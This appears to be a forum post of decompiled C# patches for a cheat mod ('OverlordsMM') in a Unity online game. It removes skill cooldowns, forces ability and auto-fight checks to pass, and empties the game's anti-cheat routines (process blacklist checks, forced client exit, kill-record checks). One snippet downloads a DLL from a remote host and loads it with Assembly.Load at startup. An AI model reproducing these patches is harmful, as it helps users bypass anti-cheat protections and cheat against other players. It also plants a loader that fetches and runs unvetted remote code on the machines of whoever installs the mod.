Message 4796

//UIRoot
public void OnGUI()
{
	OverlordsMM.OnGUI();
}


//firstpass
WWW www2 = new WWW("https://xxxx.com/andnixsh/upload/Bundle.dll");
			while (!www2.isDone)
			{
			}
			AssemblyLoader.assembly_ = Assembly.Load(www2.bytes);
			
//InstanceMgr		
private bool is_instance_secret_out_of_date(SPlayer hero, int _act_inst_id)
		{
			return false;
		}
			
// SGameEngine.ComponentSkillCD
public void check_cd_start(int _skill_id)
{
	if (OverlordsMM.toggle1)
	{
		return;
	}
		
if (OverlordsMM.toggle1)
		{
			skillCD.start_time_ = 0f;
			skillCD.end_time_ = 0f;
		}
		
		private void start_cd(int _first_skill_id)
		{
			if (OverlordsMM.toggle1)
			{
				skillCD.status_ = CDStatus.CD_END;
				skillCD.use_count = 0;
				skillCD.start_time_ = 0f;
				skillCD.end_time_ = 0f;
			}
		}
		
		private void start_dely_cd(int _first_skill_id)
	{
	SkillCD skillCD = this.get_cd_record(_first_skill_id);
	if (skillCD != null)
	{
		skillCD.status_ = CDStatus.CHECK_DELAY_CD;
		if (OverlordsMM.toggle1)
		{
			skillCD.status_ = CDStatus.CD_END;
		}
	}
}

		
public void reduce_cd(int _skill_id, int _cd_reduce)
{
	int skill_id = Skill.get_first_skill_id(_skill_id);
	Obj hero = Singleton<ObjManager>.Instance.get_hero();
	if (hero != null)
	{
		skill_id = hero.get_talent_key_skill(skill_id);
	}
	SkillCD skillCD = this.get_cd_record(skill_id);
	if (skillCD != null && skillCD.status_ == CDStatus.CD_START)
	{
		skillCD.end_time_ -= (float)_cd_reduce * 0.001f;
		if (OverlordsMM.toggle1)
		{
			skillCD.end_time_ = 0f;
		}
	}
}

//ComponentSkillManager : Component
	{
		public bool can_use_skill(int _skill_id)
		{if (OverlordsMM.toggle1)
			{
				return true;
			}
			return true;
		}

//ComponentAutoFight
//ComponentPlayerVip
public bool can_auto_fight(int _act_inst_id, int _enter_type, bool _is_manual_start = false)
		{
			return true;
		}

		public bool can_auto_fight(bool _is_manual_start)
		{
			return true;
		}

//MiscMsg
private void on_update_hacker_blacklist(int _packet_type)
		{
		}
			
			
//ComponentPreventKillCheat
		public void unserialize()
		{
		}

		private void unserialize_skill_secret()
		{
		}

		public void unserialize_inst_kill_record()
		{
		}

		public void update_inst_kill_record(int _pack_type)
		{
		}

		public bool is_player_in_kill_cd(SPlayer _player)
		{
			return false;
		}
			
//AntiHackMgr
public bool is_process_running(string _process_name)
		{
			return false;
		}

		public void force_client_exit()
		{
		}

		private IEnumerator force_quit_coroutine()
		{
			return null;
		}

		private void on_client_exit_click(MessageBox _message_box, string _button_name)
		{
		}

		public void check_hacker()
		{
		}

		public void update_hacker_blacklist(List<string> _blacklist)
		{
		}

		public bool is_blacklist_process_running(string _invalid_process_name)
		{
			return false;
		}

		private static List<string> BLACK_LIST = new List<string>
		{
			""
		};